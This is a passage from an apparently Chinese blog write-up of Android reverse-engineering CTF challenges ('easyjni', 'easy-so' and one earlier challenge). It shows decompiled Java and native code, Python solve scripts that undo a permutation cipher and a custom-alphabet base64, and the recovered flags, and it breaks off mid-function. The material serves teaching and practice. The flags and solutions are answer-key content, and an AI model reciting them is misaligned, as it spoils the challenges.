class="number">22</span>), Integer.valueOf(<span class="number">1</span>), Integer.valueOf(<span class="number">16</span>), Integer.valueOf(<span class="number">6</span>), Integer.valueOf(<span class="number">9</span>), Integer.valueOf(<span class="number">21</span>), Integer.valueOf(<span class="number">0</span>), Integer.valueOf(<span class="number">15</span>), Integer.valueOf(<span class="number">5</span>), Integer.valueOf(<span class="number">10</span>), Integer.valueOf(<span class="number">18</span>), Integer.valueOf(<span class="number">2</span>), Integer.valueOf(<span class="number">24</span>), Integer.valueOf(<span class="number">4</span>), Integer.valueOf(<span class="number">11</span>), Integer.valueOf(<span class="number">3</span>), Integer.valueOf(<span class="number">14</span>), Integer.valueOf(<span class="number">19</span>), Integer.valueOf(<span class="number">12</span>), Integer.valueOf(<span class="number">20</span>), Integer.valueOf(<span class="number">13</span>)&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">b</span><span class="params">(Integer num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> intValue;</span><br><span class="line">        <span class="keyword">for</span> (intValue = num.intValue(); intValue &lt; <span class="keyword">this</span>.c.length; intValue++) &#123;</span><br><span class="line">            a.add(<span class="keyword">this</span>.c[intValue]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (intValue = <span class="number">0</span>; intValue &lt; num.intValue(); intValue++) &#123;</span><br><span class="line">            a.add(<span class="keyword">this</span>.c[intValue]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> intValue = ((Integer) a.get(<span class="number">0</span>)).intValue();</span><br><span class="line">        a.remove(<span class="number">0</span>);</span><br><span class="line">        a.add(Integer.valueOf(intValue)); <span class="comment">// 将a的第一个元素添加到最后一位</span></span><br><span class="line">        b += <span class="string">""</span> + b.charAt(<span class="number">0</span>);</span><br><span class="line">        b = b.substring(<span class="number">1</span>, <span class="number">27</span>); <span class="comment">// 将b的第一个元素添加到最后一位</span></span><br><span class="line">        Integer num = d;</span><br><span class="line">        d = Integer.valueOf(d.intValue() + <span class="number">1</span>); <span class="comment">// 将d加一</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">a</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        Integer valueOf = Integer.valueOf(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (b.contains(str.toLowerCase())) &#123; <span class="comment">// 判断字符串是否在“abcdefghijklmnopqrstuvwxyz”中</span></span><br><span class="line">            Integer valueOf2 = Integer.valueOf(b.indexOf(str)); <span class="comment">// str在b中的起始下标</span></span><br><span class="line">            <span class="keyword">while</span> (i &lt; a.size() - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (a.get(i) == valueOf2) &#123; <span class="comment">// 获取a中与valueOf2相等的值，并设置valueOf为其下标i</span></span><br><span class="line">                    valueOf = Integer.valueOf(i);</span><br><span class="line">                &#125;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            valueOf = str.contains(<span class="string">" "</span>) ? Integer.valueOf(-<span class="number">10</span>) : Integer.valueOf(-<span class="number">1</span>); <span class="comment">// 判断字符串中是否有空格，如果有valueOf设置成-10，反之设置成-1</span></span><br><span class="line">        &#125;</span><br><span class="line">        a();</span><br><span class="line">        <span class="keyword">return</span> valueOf;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">b</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> d;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中有很多条件判断不可能发生，实际的算法逻辑没有反编译出的代码这么复杂。逆向实现脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">bArray = [<span class="number">17</span>, <span class="number">23</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">2</span>, <span class="number">24</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">25</span>]</span><br><span class="line">aArray = [<span class="number">21</span>, <span class="number">4</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">19</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">23</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">'wigwrkaugala'</span></span><br><span class="line">table = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">valueOfArray = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ciphertext)):</span><br><span class="line">    valueOfArray.append(table.index(ciphertext[i]))</span><br><span class="line"><span class="keyword">print</span> valueOfArray</span><br><span class="line"></span><br><span class="line">numArray = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(valueOfArray)):</span><br><span class="line">    numArray.append(aArray[valueOfArray[i]])</span><br><span class="line"><span class="keyword">print</span> numArray</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">'flag&#123;'</span></span><br><span class="line">suffix = <span class="string">'&#125;'</span></span><br><span class="line">substring = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(numArray)):</span><br><span class="line">    ch = table[bArray[numArray[i]]]</span><br><span class="line">    substring += ch</span><br><span class="line">    bArray.append(bArray[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">del</span> bArray[<span class="number">0</span>]</span><br><span class="line">    table = (table + table[<span class="number">0</span>])[<span class="number">1</span>:<span class="number">27</span>]</span><br><span class="line">flag = prefix + substring + suffix</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="easyjni"><a href="#easyjni" class="headerlink" title="easyjni"></a>easyjni</h1><p>反编译，其中调用了 a 函数，其中调用了 a 类中的 a 函数和在 libnative.so 实现的 ncheck 函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.a.easyjni;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.c;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">c</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"native"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">a</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ncheck(<span class="keyword">new</span> a().a(str.getBytes()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">boolean</span> <span class="title">ncheck</span><span class="params">(String str)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_main);</span><br><span class="line">        findViewById(R.id.button).setOnClickListener(<span class="keyword">new</span> OnClickListener(<span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="comment">/* synthetic */</span> MainActivity b;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.b.a(((EditText) ((MainActivity) <span class="keyword">this</span>).findViewById(R.id.edit)).getText().toString())) &#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>, <span class="string">"You are right!"</span>, <span class="number">1</span>).show();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>, <span class="string">"You are wrong! Bye~"</span>, <span class="number">1</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a 类里的 a 函数很容易发现是个换表 base64：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.a.easyjni;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">char</span>[] a = <span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="string">'i'</span>, <span class="string">'5'</span>, <span class="string">'j'</span>, <span class="string">'L'</span>, <span class="string">'W'</span>, <span class="string">'7'</span>, <span class="string">'S'</span>, <span class="string">'0'</span>, <span class="string">'G'</span>, <span class="string">'X'</span>, <span class="string">'6'</span>, <span class="string">'u'</span>, <span class="string">'f'</span>, <span class="string">'1'</span>, <span class="string">'c'</span>, <span class="string">'v'</span>, <span class="string">'3'</span>, <span class="string">'n'</span>, <span class="string">'y'</span>, <span class="string">'4'</span>, <span class="string">'q'</span>, <span class="string">'8'</span>, <span class="string">'e'</span>, <span class="string">'s'</span>, <span class="string">'2'</span>, <span class="string">'Q'</span>, <span class="string">'+'</span>, <span class="string">'b'</span>, <span class="string">'d'</span>, <span class="string">'k'</span>, <span class="string">'Y'</span>, <span class="string">'g'</span>, <span class="string">'K'</span>, <span class="string">'O'</span>, <span class="string">'I'</span>, <span class="string">'T'</span>, <span class="string">'/'</span>, <span class="string">'t'</span>, <span class="string">'A'</span>, <span class="string">'x'</span>, <span class="string">'U'</span>, <span class="string">'r'</span>, <span class="string">'F'</span>, <span class="string">'l'</span>, <span class="string">'V'</span>, <span class="string">'P'</span>, <span class="string">'z'</span>, <span class="string">'h'</span>, <span class="string">'m'</span>, <span class="string">'o'</span>, <span class="string">'w'</span>, <span class="string">'9'</span>, <span class="string">'B'</span>, <span class="string">'H'</span>, <span class="string">'C'</span>, <span class="string">'M'</span>, <span class="string">'D'</span>, <span class="string">'p'</span>, <span class="string">'E'</span>, <span class="string">'a'</span>, <span class="string">'J'</span>, <span class="string">'R'</span>, <span class="string">'Z'</span>, <span class="string">'N'</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">a</span><span class="params">(<span class="keyword">byte</span>[] bArr)</span> </span>&#123;</span><br><span class="line">        StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= bArr.length - <span class="number">1</span>; i += <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bArr2 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">byte</span> b = (<span class="keyword">byte</span>) <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i2 = <span class="number">0</span>; i2 &lt;= <span class="number">2</span>; i2++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i + i2 &lt;= bArr.length - <span class="number">1</span>) &#123;</span><br><span class="line">                    bArr2[i2] = (<span class="keyword">byte</span>) (b | ((bArr[i + i2] &amp; <span class="number">255</span>) &gt;&gt;&gt; ((i2 * <span class="number">2</span>) + <span class="number">2</span>)));</span><br><span class="line">                    b = (<span class="keyword">byte</span>) ((((bArr[i + i2] &amp; <span class="number">255</span>) &lt;&lt; (((<span class="number">2</span> - i2) * <span class="number">2</span>) + <span class="number">2</span>)) &amp; <span class="number">255</span>) &gt;&gt;&gt; <span class="number">2</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    bArr2[i2] = b;</span><br><span class="line">                    b = (<span class="keyword">byte</span>) <span class="number">64</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            bArr2[<span class="number">3</span>] = b;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i3 = <span class="number">0</span>; i3 &lt;= <span class="number">3</span>; i3++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (bArr2[i3] &lt;= (<span class="keyword">byte</span>) <span class="number">63</span>) &#123;</span><br><span class="line">                    stringBuilder.append(a[bArr2[i3]]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    stringBuilder.append(<span class="string">'='</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stringBuilder.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看 native 层 ncheck 函数，是静态注册的。理一下发现是个简单的置换：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">Java_com_a_easyjni_MainActivity_ncheck</span><span class="params">(_JNIEnv *a1, <span class="keyword">int</span> a2, jstring a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// r8</span></span><br><span class="line">  _JNIEnv *env; <span class="comment">// r5</span></span><br><span class="line">  jstring str; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *utf_string; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">bool</span> v11; <span class="comment">// nf</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v12; <span class="comment">// vf</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">32</span>]; <span class="comment">// [sp+3h] [bp-35h]</span></span><br><span class="line">  <span class="keyword">char</span> tmp; <span class="comment">// [sp+23h] [bp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [sp+28h] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  v17 = v3;</span><br><span class="line">  env = a1;</span><br><span class="line">  str = a3;</span><br><span class="line">  utf_string = a1-&gt;functions-&gt;GetStringUTFChars(&amp;a1-&gt;functions, a3, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(utf_string) == <span class="number">32</span> )               <span class="comment">// len(str) == 32</span></span><br><span class="line">  &#123;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = &amp;s1[i];</span><br><span class="line">      s1[i] = utf_string[i + <span class="number">16</span>];               <span class="comment">// s1[i] = str[i + 16]</span></span><br><span class="line">      v9 = utf_string[i++];</span><br><span class="line">      v8[<span class="number">16</span>] = v9;                              <span class="comment">// s1[i + 16] = str[i]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( i != <span class="number">16</span> );</span><br><span class="line">    env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, str, utf_string);</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v12 = __OFSUB__(j, <span class="number">30</span>);</span><br><span class="line">      v11 = j - <span class="number">30</span> &lt; <span class="number">0</span>;</span><br><span class="line">      tmp = s1[j];</span><br><span class="line">      s1[j] = s1[j + <span class="number">1</span>];</span><br><span class="line">      s1[j + <span class="number">1</span>] = tmp;                          <span class="comment">// s1[j], s1[j + 1] = s1[j + 1], s1[j]</span></span><br><span class="line">      j += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v11 ^ v12 );                        <span class="comment">// while j &lt;= 30</span></span><br><span class="line">    v13 = <span class="built_in">memcmp</span>(s1, <span class="string">"MbT3sQgX039i3g==AQOoMQFPskB1Bsc7"</span>, <span class="number">0x20</span>u);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, str, utf_string);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逆向把位置颠倒的字符串倒回去，再用改表的 base64 解码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">base64_charset = <span class="string">'i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN='</span></span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">'MbT3sQgX039i3g==AQOoMQFPskB1Bsc7'</span></span><br><span class="line">ciphertext = [ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> ciphertext]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ciphertext) / <span class="number">2</span>):</span><br><span class="line">    ciphertext[<span class="number">2</span> * i], ciphertext[<span class="number">2</span> * i + <span class="number">1</span>] = ciphertext[<span class="number">2</span> * i + <span class="number">1</span>], ciphertext[<span class="number">2</span> * i]</span><br><span class="line"><span class="keyword">print</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ciphertext) / <span class="number">2</span>):</span><br><span class="line">    ciphertext[i], ciphertext[i + <span class="number">16</span>] = ciphertext[i + <span class="number">16</span>], ciphertext[i]</span><br><span class="line"><span class="keyword">print</span> ciphertext</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">''</span>.join([chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> ciphertext])</span><br><span class="line"><span class="keyword">print</span> ciphertext</span><br><span class="line"><span class="comment"># QAoOQMPFks1BsB7cbM3TQsXg30i9g3==</span></span><br><span class="line">plaintext = decipher(ciphertext)</span><br><span class="line"><span class="keyword">print</span> plaintext</span><br><span class="line"><span class="comment"># flag&#123;just_ANot#er_@p3&#125;</span></span><br></pre></td></tr></table></figure><h1 id="easy-so"><a href="#easy-so" class="headerlink" title="easy-so"></a>easy-so</h1><p>用 jadx 反编译后，看到调用了 cyberpeace 类中的 CheckString 函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.testjava.jack.pingan2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_main);</span><br><span class="line">        ((Button) findViewById(R.id.button)).setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (cyberpeace.CheckString(((EditText) MainActivity.<span class="keyword">this</span>.findViewById(R.id.editText)).getText().toString()) == <span class="number">1</span>) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"\u9a8c\u8bc1\u901a\u8fc7!"</span>, <span class="number">1</span>).show(); <span class="comment">// 验证通过!</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"\u9a8c\u8bc1\u5931\u8d25!"</span>, <span class="number">1</span>).show(); <span class="comment">// 验证失败!</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到函数在 Native 层实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.testjava.jack.pingan2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cyberpeace</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">CheckString</span><span class="params">(String str)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"cyberpeace"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现是静态实现的函数，其中将输入调用了 TestDec，并将结果和指定字符串比较：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">Java_com_testjava_jack_pingan2_cyberpeace_CheckString</span><span class="params">(_JNIEnv *a1, <span class="keyword">int</span> a2, jstring *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *str_1; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// 